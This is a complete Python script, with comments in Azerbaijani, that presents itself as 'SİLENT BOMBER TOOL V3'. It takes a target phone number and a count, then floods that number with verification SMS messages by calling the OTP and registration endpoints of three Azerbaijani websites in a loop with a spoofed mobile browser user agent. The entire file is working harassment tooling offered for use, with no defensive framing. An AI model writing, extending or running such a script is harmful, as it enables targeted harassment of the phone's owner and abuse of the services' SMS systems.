import requests
import time
import random
import os
import re

# --- AYARLAR ---
U_AGENT = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"

# --- API FUNKSİYALARI ---
def api_tats(tel):
    try:
        return requests.post("https://api.tats.az/authotp/otp/request", 
                             headers={"User-Agent": U_AGENT}, 
                             json={"phone": "+994" + tel, "purpose": "register"}, 
                             timeout=10)
    except: return None

def api_radar(tel):
    try:
        payload = "{\"source\":\"web\",\"lang\":\"\",\"app_id\":12,\"operator\":3,\"msisdn\":\"994" + tel + "\"}"
        return requests.post("https://web.smsradar.az/api/core/register/step1", 
                             headers={"User-Agent": U_AGENT, "Content-Type": "text/plain;charset=UTF-8"}, 
                             data=payload, timeout=10)
    except: return None

def api_auto(tel):
    try:
        return requests.post("https://api.auto.az/v2/az/auth", 
                             headers={"User-Agent": U_AGENT}, 
                             json={"phone": "0" + tel}, timeout=10)
    except: return None

APIS = [
    ("Tats.az", api_tats),
    ("SmsRadar.az", api_radar),
    ("Auto.az", api_auto)
]

def start_bombing():
    os.system('clear')
    print("="*30)
    print("🚀 SİLENT BOMBER TOOL V3")
    print("="*30)
    
    num = input("🎯 Hədəf nömrə (məs: 501234567): ").strip()
    num = re.sub(r'\D', '', num) # Rəqəmləri təmizləyir
    
    # Nömrə formatını tənzimləmə
    if num.startswith("994"): num = num[3:]
    elif num.startswith("0"): num = num[1:]

    try:
        count = int(input("🔢 Göndəriş sayı: "))
    except ValueError:
        print("❌ Xəta: Say rəqəm olmalıdır!")
        return

    print(f"\n🔥 0{num} nömrəsinə hücum başladı...\n")

    success = 0
    for i in range(count):
        print(f"🔄 Dövriyyə {i+1}/{count}...")
        for name, func in APIS:
            res = func(num)
            if res and res.status_code in [200, 201, 202]:
                print(f" ✅ {name}: Uğurlu")
                success += 1
            else:
                print(f" ❌ {name}: Alınmadı")
            time.sleep(1) # Saytları bloklamamaq üçün qısa fasilə
        
        if i < count - 1:
            print("⏳ Növbəti dövriyyə üçün gözlənilir (10 san)...")
            time.sleep(10)

    print("\n" + "="*30)
    print(f"✅ Əməliyyat bitdi!")
    print(f"🟢 Cəmi uğurlu sorğu: {success}")
    print("="*30)

if __name__ == "__main__":
    start_bombing()
